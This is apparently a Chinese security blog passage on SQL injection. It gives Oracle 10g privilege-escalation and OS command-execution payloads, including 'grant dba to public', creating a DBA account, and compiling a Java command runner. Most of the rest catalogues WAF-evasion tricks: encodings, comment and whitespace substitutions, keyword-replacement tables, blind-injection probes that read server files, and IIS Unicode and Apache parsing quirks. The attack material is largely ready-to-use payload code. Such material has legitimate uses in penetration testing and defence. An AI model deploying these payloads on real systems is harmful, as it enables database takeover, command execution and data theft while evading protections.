<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">测试环境:</span><br><span class="line">CentOS Linux release 7.2.1511 (Core)</span><br><span class="line">Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit Production</span><br><span class="line"></span><br><span class="line">执行方式很多种，这边只研究Oracle10g，并且本地实测成功的:</span><br><span class="line">DBMS_EXPORT_EXTENSION()</span><br><span class="line">dbms_xmlquery.newcontext()</span><br><span class="line">DBMS_JAVA_TEST.FUNCALL()</span><br></pre></td></tr></table></figure>

<p>注意：注入时需去除末尾分号;</p>
<h3 id="DBMS-EXPORT-EXTENSION"><a href="#DBMS-EXPORT-EXTENSION" class="headerlink" title="DBMS_EXPORT_EXTENSION()"></a>DBMS_EXPORT_EXTENSION()</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</span><br><span class="line">权限：None</span><br><span class="line">详情：这个软件包有许多易受PL/SQL注入攻击的函数。这些函数由SYS拥有，作为SYS执行并且可由PUBLIC执行。因此，如果SQL注入处于上述任何未修补的Oracle数据库版本中，那么攻击者可以调用该函数并直接执行SYS查询。</span><br><span class="line">提权：该请求将导致查询&quot;GRANT DBA TO PUBLIC&quot;以SYS身份执行。 因为这个函数允许PL / SQL缺陷（PL / SQL注入）。一旦这个请求成功执行，PUBLIC获取DBA角色，从而提升当前user的特权</span><br><span class="line">payload：select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#x27;FOO&#x27;,&#x27;BAR&#x27;,&#x27;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#x27;&#x27;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#x27;&#x27;&#x27;&#x27;grant dba to public&#x27;&#x27;&#x27;&#x27;;END;&#x27;&#x27;;END;--&#x27;,&#x27;SYS&#x27;,0,&#x27;1&#x27;,0) from dual</span><br><span class="line"></span><br><span class="line">建立DBA权限的TEST帐号</span><br><span class="line">select dbms_xmlquery.newcontext(&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;grant dba to test identified by test&#x27;&#x27;;commit;end;&#x27;) from dual;</span><br><span class="line"></span><br><span class="line">直接添加CMDHSHELL</span><br><span class="line"></span><br><span class="line">1.创建java包：</span><br><span class="line">select dbms_xmlquery.newcontext(&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;&#x27;;commit;end;&#x27;) from dual;</span><br><span class="line"></span><br><span class="line">2.赋予java权限：</span><br><span class="line">select dbms_xmlquery.newcontext(&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;begin dbms_java.grant_permission( &#x27;&#x27;&#x27;&#x27;SYSTEM&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;SYS:java.io.FilePermission&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;&#x27;&#x27;&#x27;,&#x27;&#x27;&#x27;&#x27;EXECUTE&#x27;&#x27;&#x27;&#x27;);end;&#x27;&#x27;commit;end;&#x27;) from dual;</span><br><span class="line"></span><br><span class="line">3.创建函数：</span><br><span class="line">select dbms_xmlquery.newcontext(&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;;commit;end;&#x27;) from dual;</span><br><span class="line"></span><br><span class="line">4.执行命令:</span><br><span class="line">|| utl_inaddr.get_host_name((select LinxRunCMD(&#x27;cmd /c dir d:&#x27;)))--</span><br></pre></td></tr></table></figure>

<h3 id="dbms-xmlquery-newcontext"><a href="#dbms-xmlquery-newcontext" class="headerlink" title="dbms_xmlquery.newcontext()"></a>dbms_xmlquery.newcontext()</h3><h3 id="DBMS-JAVA-TEST-FUNCALL"><a href="#DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="DBMS_JAVA_TEST.FUNCALL()"></a>DBMS_JAVA_TEST.FUNCALL()</h3><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">https://www.t00ls.net/viewthread.php?tid=45663&amp;highlight=Oracle%E6%B3%A8%E5%85%A5</span><br></pre></td></tr></table></figure>

<h1 id="逃逸waf注入技术"><a href="#逃逸waf注入技术" class="headerlink" title="逃逸waf注入技术"></a>逃逸waf注入技术</h1><h3 id="简单WAF绕过技术"><a href="#简单WAF绕过技术" class="headerlink" title="简单WAF绕过技术"></a>简单WAF绕过技术</h3><h4 id="常见绕过技术"><a href="#常见绕过技术" class="headerlink" title="常见绕过技术"></a>常见绕过技术</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">技术分类：</span><br><span class="line">a)大小写混合</span><br><span class="line"></span><br><span class="line">b)替换关键字</span><br><span class="line"></span><br><span class="line">c)使用编码</span><br><span class="line">utf-7的绕过，还有utf-16、utf-32的绕过</span><br><span class="line">d)使用注释</span><br><span class="line"></span><br><span class="line">e)等价函数与命令</span><br><span class="line"></span><br><span class="line">f)特殊符号</span><br><span class="line"></span><br><span class="line">g)HTTP参数控制</span><br><span class="line"></span><br><span class="line">h)缓冲区溢出</span><br><span class="line"></span><br><span class="line">i)整合绕过</span><br></pre></td></tr></table></figure>

<h4 id="常见符号绕过"><a href="#常见符号绕过" class="headerlink" title="常见符号绕过"></a>常见符号绕过</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">表名列名等单/双引号过滤：</span><br><span class="line">1.使用char()函数绕过：</span><br><span class="line">concat(char(99),char(116),char(102),char(52))</span><br><span class="line"></span><br><span class="line">2.使用十六进制绕过：</span><br><span class="line">比如：ctf =十六进制转换=&gt; 0x630x740x66</span><br><span class="line"></span><br><span class="line">3.html实体编码：</span><br><span class="line">&amp;#39</span><br><span class="line"></span><br><span class="line">4.双url编码：</span><br><span class="line">%2527</span><br><span class="line">这里主要是因为绕过magic_quotes_gpc过滤，因为%25解码为%,结合后面的27也就是%27也就是&#x27;，所以成功绕过过滤。</span><br></pre></td></tr></table></figure>

<h4 id="过滤-等逻辑处理字符"><a href="#过滤-等逻辑处理字符" class="headerlink" title="过滤&amp;,|,*,&#x2F;,&#x3D;等逻辑处理字符"></a>过滤&amp;,|,*,&#x2F;,&#x3D;等逻辑处理字符</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">可以用in,exists,position..in,&gt;,&lt;,!,&lt;&gt;,like等操作符绕过这个链接有详细介绍http://www.runoob.com/mysql/mysql-like-clause.html</span><br><span class="line">这里举一个例子，比如要使用sql盲注的话但是过滤了substr,mid，asccii,ord等函数可以使用一下语句</span><br><span class="line"></span><br><span class="line">admin&#x27; AND password LIKE &quot;p%&quot; --</span><br></pre></td></tr></table></figure>

<h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤&lt;,&gt;"></a>过滤&lt;,&gt;</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">方法：</span><br><span class="line">使用greatest()绕过</span><br><span class="line">说明：</span><br><span class="line">greatest(n1,n2,n3,..........)返回 n1、n2、n3等一系列参数中的最大值</span><br><span class="line">实例：</span><br><span class="line">greatest(ascii(mid(user(),0,1)),150)</span><br><span class="line">and greatest(ascii(substr(database(),0,1)),64)=64</span><br><span class="line"></span><br><span class="line">方法：</span><br><span class="line">least()</span><br><span class="line">说明：</span><br><span class="line">least函数会返回最小值</span><br><span class="line">实例：</span><br><span class="line">least(ascii(mid(user(),0,1)),150)</span><br></pre></td></tr></table></figure>

<h4 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">方法：</span><br><span class="line">编码，内联注释，大小写绕过</span><br><span class="line">实例：</span><br><span class="line">%75%6e%69%6f%6e</span><br><span class="line">/*!50000union*/</span><br><span class="line">Union</span><br><span class="line"></span><br><span class="line">from过滤：</span><br><span class="line">使用from.</span><br></pre></td></tr></table></figure>

<h4 id="表名等被过滤"><a href="#表名等被过滤" class="headerlink" title="表名等被过滤"></a>表名等被过滤</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">以information_schema.tables为例</span><br><span class="line">空格 information_schema . tables</span><br><span class="line">着重号 information&lt;/em&gt;schema.tables</span><br><span class="line">特殊符 /!information——schema.tables/</span><br><span class="line">别名 information_schema.(partitions),(statistics),(keycolumnusage),(table_constraints)</span><br><span class="line"></span><br><span class="line">替换information_schema</span><br><span class="line">把information_schema.tables改成</span><br><span class="line">information_schema.statistics或</span><br><span class="line">mysql.innodb_table_stats</span><br><span class="line"></span><br><span class="line">测试:</span><br><span class="line">select schema_name from information schema.tables;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="未知字段名"><a href="#未知字段名" class="headerlink" title="未知字段名"></a>未知字段名</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1.使用虚拟表：</span><br><span class="line">原理：</span><br><span class="line">核心在将一个可控的虚拟表V1与需要查询的真实表V2联合起来（使用union select），使得表字段可控从而查询数据。</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">select a.2 from (select 1,2 from DUAL union select * from math1)a;  #查询math1表，第2个字段的值，注意d.2要和a，b要和字段数一致</span><br><span class="line">select d.2 from (select * from (select 1)a join (select 2)b union select * from math1)d;    #当过滤逗号时使用</span><br><span class="line"></span><br><span class="line">2.使用left()，进行猜解</span><br><span class="line">原理：</span><br><span class="line">当字段存在时left()返回True,否则返回False</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">select id,name from math1 where id=0 or left(name,0)=0;</span><br><span class="line">select id,name from math1 where id=1 and left(name,0)=0;   #使用数字时，永远返回true？可以猜解字符型表名</span><br></pre></td></tr></table></figure>

<h4 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">%20         #url编码</span><br><span class="line">%00         #00截断</span><br><span class="line">%09         #tab</span><br><span class="line">%0a         #绕过360云waf，是\n，绕过select.+from</span><br><span class="line">%0b</span><br><span class="line">%0c</span><br><span class="line">%0d</span><br><span class="line">%a0</span><br><span class="line">+</span><br><span class="line">-++-        #数值型可以</span><br><span class="line">-+-+-+-+~~  #同上，但是实站都行，原因未知</span><br><span class="line">!~~!        #有点问题</span><br><span class="line">/**/        #</span><br><span class="line">/*--*/</span><br><span class="line">()</span><br></pre></td></tr></table></figure>

<h4 id="判断其他过滤"><a href="#判断其他过滤" class="headerlink" title="判断其他过滤"></a>判断其他过滤</h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">实例:</span><br><span class="line">+----+-------------+</span><br><span class="line">| id | name        |</span><br><span class="line">+----+-------------+</span><br><span class="line">|  1 | langyi      |</span><br><span class="line">|  2 | luyasheng   |</span><br><span class="line">|  3 | lichongfei  |</span><br><span class="line">|  4 | xiaoming    |</span><br><span class="line">|  5 | 0           |</span><br><span class="line">|  6 | liumuzi     |</span><br><span class="line">|  7 | wangyuxing  |</span><br><span class="line">|  8 | gaoyingying |</span><br><span class="line">| 10 | pass        |</span><br><span class="line">| 11 | 0           |</span><br><span class="line">| 12 | bbbx        |</span><br><span class="line">| 13 | 0           |</span><br><span class="line">+----+-------------+</span><br><span class="line"></span><br><span class="line">1.百分号:</span><br><span class="line">select * from math1 where name like &#x27;l%&#x27; limit 1 offset 0;</span><br><span class="line">select * from math1 where id like concat(char(49),char(95));    #49=1，95=_</span><br><span class="line">MariaDB [myclass]&gt; select * from math1 where name like &#x27;l%&#x27;;</span><br><span class="line">+----+-------------+</span><br><span class="line">| id | name        |</span><br><span class="line">+----+-------------+</span><br><span class="line">|  1 | lxxxxxxxx   |</span><br><span class="line">|  2 | luyasheng   |</span><br><span class="line">|  3 | lichongfei  |</span><br><span class="line">|  6 | liumuzi     |</span><br><span class="line">| 12 | liushuqiang |</span><br><span class="line">+----+-------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">2.下划线:</span><br><span class="line">select * from math1 where id like &#x27;1_&#x27;;</span><br><span class="line">MariaDB [myclass]&gt; select * from math1 where id like &#x27;1_&#x27;;</span><br><span class="line">+----+--------------+</span><br><span class="line">| id | name         |</span><br><span class="line">+----+--------------+</span><br><span class="line">| 10 | pass         |</span><br><span class="line">| 11 | huangjingtao |</span><br><span class="line">| 12 | liushuqiang  |</span><br><span class="line">| 13 | ctfer        |</span><br><span class="line">+----+--------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">3.句号:</span><br><span class="line">select user from mysql.user;</span><br><span class="line">MariaDB [myclass]&gt; select name from myclass.math1;</span><br><span class="line">+--------------+</span><br><span class="line">| name         |</span><br><span class="line">+--------------+</span><br><span class="line">| lxxxxxxxx    |</span><br><span class="line">| luyasheng    |</span><br><span class="line">| lichongfei   |</span><br><span class="line">| xiaoming     |</span><br><span class="line">| huxingyue    |</span><br><span class="line">| liumuzi      |</span><br><span class="line">| wangyuxing   |</span><br><span class="line">| gaoyingying  |</span><br><span class="line">| pass         |</span><br><span class="line">| huangjingtao |</span><br><span class="line">| liushuqiang  |</span><br><span class="line">| ctfer        |</span><br><span class="line">+--------------+</span><br><span class="line">12 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">通用:</span><br><span class="line">select @@LOCAL.SQL_SELECT_LIMIT;</span><br><span class="line">select @@GLOBAL.VERSION;</span><br><span class="line">select CURRENT_USER();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="不安全函数绕过："><a href="#不安全函数绕过：" class="headerlink" title="不安全函数绕过："></a>不安全函数绕过：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.parse_url()</span><br><span class="line">功能说明:</span><br><span class="line">解析 URL，返回其组成部分</span><br><span class="line"></span><br><span class="line">绕过:</span><br><span class="line">获取URL的参数有一点儿问题，他并不能很好的处理，如果我们传入的是</span><br><span class="line">///upload.php?cache这样的地址，然后parse_url()处理URL会返回false，那么后面的preg_match就不会匹配到任何字符串了。</span><br><span class="line"></span><br><span class="line">2.htmlentities()</span><br><span class="line">功能说明:</span><br><span class="line">将字符转换为 HTML 转义字符</span><br><span class="line"></span><br><span class="line">绕过:</span><br><span class="line">只过滤单引号，双引号等，不过滤反斜杠 \ ，可以反斜杠 \ 转义绕过</span><br><span class="line"></span><br><span class="line">3.substr_count()</span><br><span class="line">功能说明:</span><br><span class="line">计算字串出现的次数</span><br><span class="line"></span><br><span class="line">绕过:</span><br><span class="line">使用%00</span><br><span class="line">unio%00n</span><br><span class="line"></span><br><span class="line">4.stripslashes()</span><br><span class="line">功能说明:</span><br><span class="line">去掉一个反斜杠 \</span><br><span class="line"></span><br><span class="line">5.mysql_real_escape_string()</span><br><span class="line">功能说明:</span><br><span class="line">转义 SQL 语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集 </span><br><span class="line"></span><br><span class="line">6.is_numeric()</span><br><span class="line">功能说明:</span><br><span class="line">检测变量是否为数字或数字字符串</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="通用WAF绕过："><a href="#通用WAF绕过：" class="headerlink" title="通用WAF绕过："></a>通用WAF绕过：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以绕过(,,union,select,and,or,空格,#，balabalabalabala)</span><br><span class="line">a&#x27;^!(mid((version)from(-&#123;pos&#125;))=&#x27;&#123;passwd&#125;&#x27;)=&#x27;1</span><br><span class="line"></span><br><span class="line">a&#x27;^(ascii(mid((version())from(1)))=53)^&#x27;1</span><br><span class="line">select&#123;x table_name&#125;from&#123;x information_schema.tables&#125;;</span><br><span class="line"></span><br><span class="line">if(substr(user(),1,1)in(0x41),3,0)  #id=3和id=0返回页面不同</span><br><span class="line">if(substr(version(),1,1)in(0x35),&#x27;1&#x27;,9) #注意&#x27;1&#x27;和1</span><br><span class="line"></span><br><span class="line">id=6^(if(ascii(mid(load_file(0x2F7661722F7777772F68746D6C2F696E6465782E706870),1,2))&gt;1,0,1))</span><br><span class="line"></span><br><span class="line">十六进制编码:</span><br><span class="line">0x2F7661722F7777772F68746D6C2F696E6465782E706870</span><br><span class="line">/var/www/html/index.php</span><br></pre></td></tr></table></figure>
<h3 id="关键字过滤绕过："><a href="#关键字过滤绕过：" class="headerlink" title="关键字过滤绕过："></a>关键字过滤绕过：</h3><ul>
<li>左边表示会被Filtered的语句，右边表示成功Bypass的语句，左边标红的为被Filtered的关键字，右边标蓝的为替代其功能的函数或关键字</li>
</ul>
<table>
<thead>
<tr>
<th>原语句</th>
<th>绕过语句</th>
</tr>
</thead>
<tbody><tr>
<td><font color=#FF6347>and</font></td>
<td><font color=#00BFFF>&amp;&amp;</font></td>
</tr>
<tr>
<td><font color=#FF6347>or</font></td>
<td><font color=#00BFFF>||</font></td>
</tr>
<tr>
<td><font color=#FF6347>union</font> select user, password from users</td>
<td><font color=#00BFFF>1 ||</font> (select user from users where user_id &#x3D; 1) &#x3D; ‘admin</td>
</tr>
<tr>
<td>1 || (select user from users <font color=#FF6347>where</font> user_id &#x3D; 1) &#x3D; ‘admin’</td>
<td>1 || (select user from users <font color=#00BFFF>limit</font> 1) &#x3D; ‘admin</td>
</tr>
<tr>
<td>1 || (select user from users <font color=#FF6347>limit</font> 1) &#x3D; ‘admin’</td>
<td>1 || (select user from users <font color=#00BFFF>group by</font> user_id having user_id &#x3D; 1) &#x3D; ‘admin’</td>
</tr>
<tr>
<td>1 || (select user from users <font color=#FF6347>group by</font> user_id having user_id &#x3D; 1) &#x3D; ‘admin’</td>
<td>1 || (select substr(<font color=#00BFFF>group_concat</font>(user_id),1,1) user from users )&#x3D;1</td>
</tr>
<tr>
<td>1  || (<font color=#FF6347>select</font> substr(group_concat(user_id),1,1) user from users) &#x3D; 1</td>
<td>1 || 1 &#x3D; 1 into outfile ‘result.txt’　或者  1 || substr(user,1,1) &#x3D; ‘a’</td>
</tr>
<tr>
<td>1 || (select substr(group_concat(user_id),1,1) user from users) &#x3D; 1</td>
<td>1 || user_id is not null 或者 1 || substr(user,1,1) &#x3D; 0x61 或者 1 || substr(user,1,1) &#x3D; unhex(61)　　&#x2F;&#x2F;　‘ Filtered</td>
</tr>
<tr>
<td>1 || substr(user,1,1) &#x3D; un<font color=#FF6347>hex</font>(61)</td>
<td>1 || substr(user,1,1) &#x3D; lower(<font color=#00BFFF>conv(11,10,36)</font>)</td>
</tr>
<tr>
<td>1 || <font color=#FF6347>substr</font>(user,1,1) &#x3D; lower(conv(11,10,36))</td>
<td>1 || <font color=#00BFFF>lpad</font>(user,7,1)</td>
</tr>
<tr>
<td>1 || lpad(user,7,1)</td>
<td>1%0b||%0blpad(user,7,1)　　&#x2F;&#x2F; ‘ ‘ Filtered</td>
</tr>
</tbody></table>
<h3 id="高级WAF绕过技术："><a href="#高级WAF绕过技术：" class="headerlink" title="高级WAF绕过技术："></a>高级WAF绕过技术：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分类：</span><br><span class="line">1.云waf；[阿里云盾，百度云加速，360网站卫士，加速乐等]</span><br><span class="line">2.传统安全厂商的硬件waf以及一直存在的ips，ids设备；[绿盟，启明，深信服，安恒等]</span><br><span class="line">3.主机防护软件如安全狗，云锁；</span><br><span class="line">4.软waf如modsecurity，nginx-lua-waf等。</span><br></pre></td></tr></table></figure>
<h3 id="WAF在哪里"><a href="#WAF在哪里" class="headerlink" title="WAF在哪里:"></a>WAF在哪里:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里我就用&#x27;WAF&#x27;来代替上面所说的一些防护软件，我们需要知道这些WAF都在网络空间的哪些位置。</span><br><span class="line">用户从浏览器发出一个请求（http://www.miku.com/1.php?id=1%20and1=1）到最终请求转发到服务器上，中间经历了多少设备，这些工作在网络的第几层（TCP/IP协议）？我们应用层的数据被哪些设备处理了？</span><br><span class="line">这是一个经典的数通问题，了解WAF在网络空间的位置，我们便可以更清楚的知道使用哪些知识来协助我们进行WAF bypass。</span><br></pre></td></tr></table></figure>
<ul>
<li>如下图所示:<img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217173148997.png" alt="image-20251217173148997"></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">画了一个简单的拓扑图。</span><br><span class="line">图中可以很清楚的看到，我们的云waf，硬件ips/ids防护，硬件waf，主机防护，软waf以及应用程序所在的位置。</span><br></pre></td></tr></table></figure>
<h3 id="WAF数据处理"><a href="#WAF数据处理" class="headerlink" title="WAF数据处理:"></a>WAF数据处理:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在明白了各种防护软件在网络环境下的拓扑之后，现在了解一下基础数据的流量与相关设备的基本处理。</span><br><span class="line"></span><br><span class="line">假设客户端访问url：http://www.miku.com/1.php?id=1&#x27;and&#x27;1&#x27;=&#x27;1，该请求请求的数据是服务器上数据库中id为1的记录。</span><br></pre></td></tr></table></figure>
<ul>
<li>假设这台服务器使用了相关云waf。</li>
</ul>
<ol>
<li><p>一个完整的过程，首先会请求DNS，由于配置云waf的时候，会修改DNS的解析。我们发送DNS请求之后，域名会被解析到云WAF的ip上去。DNS解析完成之后，获取到域名信息，然后进入下一个步骤。</p>
</li>
<li><p>HTTP协议是应用层协议，且是tcp协议，因此会首先去做TCP的三次握手，此处不去抠三次握手的细节，假设三次握手建立完毕。</p>
</li>
<li><p>发送HTTP请求过去，请求会依次经过云WAF，硬件IPS&#x2F;IDS设备，硬件WAF设备，服务器，web服务器，主机防护软件&#x2F;软WAF，WEB程序，数据库。 云WAF，硬件IPS&#x2F;IDS，硬件WAF均有自己处理数据的方式。云WAF与硬件WAF细节上不太清楚，对于硬件IPS有一定的了解。之前在drops上发过一篇文章，文章链接是：<a href="http://drops.wooyun.org/papers/4323%E3%80%82">http://drops.wooyun.org/papers/4323。</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在获取HTTP数据之前会做TCP重组，重组主要目的是针对互联网数据包在网络上传输的时候会出现乱序的情况，数据包被重组之后就会做协议解析，取出相关的值。如http_method=GET,http_payload=xxx等等。这些值就对应了IPS规则中相关规则的值。从而来判断规则匹配与不匹配。</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="WAF-BYPASS的理解"><a href="#WAF-BYPASS的理解" class="headerlink" title="WAF BYPASS的理解:"></a>WAF BYPASS的理解:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在我自己看来，所谓的BYPASS WAF实际上是去寻找位于WAF设备之后处理应用层数据包的硬件/软件的特性。利用特性构造WAF不能命中，但是在应用程序能够执行成功的载荷，绕过防护。</span><br><span class="line"></span><br><span class="line">那些特性就像是一个个特定的场景一样，一些是已经被研究人员发现的，一些是还没被发现，等待被研究人员发现的。当我们的程序满足了这一个个的场景，倘若WAF没有考虑到这些场景，我们就可以利用这些特性bypass掉WAF了。</span><br></pre></td></tr></table></figure>
<ul>
<li>例如我们现在需要bypass一个云WAF&#x2F;IPS&#x2F;硬件WAF，此处我们可以利用的点就是：</li>
</ul>
<ol>
<li>Web服务器层bypass</li>
<li>Web应用程序层bypass</li>
<li>数据库层 bypass</li>
<li>WAF层bypass<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于各个层面可以利用的特性很多，而且WAF往往要考虑自身的性能等等方面，导致了WAF往往会留下一些软肋。下面的文章来细细的总结下之前那些经常被用来做bypass的特性。</span><br><span class="line"></span><br><span class="line">Ps.思路是不是稍微清晰了一点。= =</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="Bypass-WAF-姿势"><a href="#Bypass-WAF-姿势" class="headerlink" title="Bypass WAF 姿势:"></a>Bypass WAF 姿势:</h3><h4 id="通过真实ip-bypass"><a href="#通过真实ip-bypass" class="headerlink" title="通过真实ip bypass:"></a>通过真实ip bypass:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">思路:</span><br><span class="line">通过服务端发送邮件，查看原文件，获取真实Ip，然后通过修改host，域名解析到真实Ip,绕过cdn云waf</span><br><span class="line">https://www.t00ls.net/thread-42975-1-1.html</span><br><span class="line">https://www.t00ls.net/viewthread.php?tid=34467&amp;highlight=%E7%9C%9F%E5%AE%9Eip</span><br></pre></td></tr></table></figure>
<h4 id="Web-Server层-bypass"><a href="#Web-Server层-bypass" class="headerlink" title="Web Server层 bypass:"></a>Web Server层 bypass:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用WEB服务器的特性来进行WAF bypass，常见的组合就有asp+IIS aspx+IIS php+apache java+tomcat等。</span><br><span class="line"></span><br><span class="line">这部分内容大多是用来做http的解析等相关事务的，因此这里我理解的也就是寻找WAF对于http解析以及真实环境对于http解析的差异特性，利用差异特性来bypass WAF。</span><br><span class="line"></span><br><span class="line">Ps.这部分待挖掘的地方还有很多，而且这部分挖掘出来的特性应该对于WAF的bypass是致命的。</span><br></pre></td></tr></table></figure>
<h5 id="IIS服务器"><a href="#IIS服务器" class="headerlink" title="IIS服务器"></a>IIS服务器</h5><h6 id="特性"><a href="#特性" class="headerlink" title="%特性"></a>%特性</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在asp+iis的环境中存在一个特性，就是特殊符号%，在该环境下当们我输入s%elect的时候，在WAF层可能解析出来的结果就是s%elect，但是在iis+asp的环境的时候，解析出来的结果为select。</span><br><span class="line"></span><br><span class="line">本地搭建asp+iis环境测试</span><br></pre></td></tr></table></figure>
<ul>
<li>测试效果如下图：<img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217173334542.png" alt="image-20251217173334542"></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ps.此处猜测可能是iis下asp.dll解析时候的问题，aspx+iis的环境就没有这个特性。</span><br></pre></td></tr></table></figure>
<h6 id="u特性"><a href="#u特性" class="headerlink" title="%u特性"></a>%u特性</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Iis服务器支持对于unicode的解析，例如我们对于select中的字符进行unicode编码，可以得到如下的s%u006c%u0006ect，这种字符在IIS接收到之后会被转换为select，但是对于WAF层，可能接收到的内容还是s%u006c%u0006ect，这样就会形成bypass的可能。我们搭建asp+iis和aspx+iis的环境：</span><br></pre></td></tr></table></figure>
<ol>
<li>asp+iis的环境测试效果如图：<img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217173410805.png" alt="image-20251217173410805"></li>
<li>aspx+iis的环境测试效果如图：<img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217173457310.png" alt="image-20251217173457310"></li>
</ol>
<h6 id="另类-u特性"><a href="#另类-u特性" class="headerlink" title="另类%u特性"></a>另类%u特性</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ps.需要注意的是，这个特性测试的时候发现aspx+iis的环境是不支持的，有待做实验考证，怀疑是后缀后面的内容是通过asp.net isapi来出来的，导致了asp和aspx的不同。</span><br><span class="line"></span><br><span class="line">上面写到了iis支持unicode的格式的解析。这种iis解析，存在一个特性，之前在wooyun上报过一个漏洞： WooYun: 一个有意思的通用windows防火墙bypass(云锁为例) 。</span><br><span class="line"></span><br><span class="line">该漏洞主要利用的是unicode在iis解析之后会被转换成multibyte，但是转换的过程中可能出现： 多个widechar会有可能转换为同一个字符。</span><br><span class="line"></span><br><span class="line">打个比方就是譬如select中的e对应的unicode为%u0065，但是%u00f0同样会被转换成为e。</span><br><span class="line"></span><br><span class="line">s%u0065lect-&gt;select</span><br><span class="line">s%u00f0lect-&gt;select</span><br><span class="line"></span><br><span class="line">WAF层可能能识别s%u0065lect的形式，但是很有可能识别不了s%u00f0lect的形式。这样就可以利用起来做WAF的绕过。</span><br></pre></td></tr></table></figure>
<ul>
<li>asp+iis的环境测试效果如图：<img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217173544464.png" alt="image-20251217173544464"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ps.该漏洞的利用场景可能有局限性，但是挖掘思路是可以借鉴的。</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="apache服务器"><a href="#apache服务器" class="headerlink" title="apache服务器"></a>apache服务器</h5><h6 id="畸形method"><a href="#畸形method" class="headerlink" title="畸形method"></a>畸形method</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">某些apache版本在做GET请求的时候，无论method为何值均会取出GET的内容，如请求为的method为DOTA2，依然返回了aid为2的结果。</span><br></pre></td></tr></table></figure>
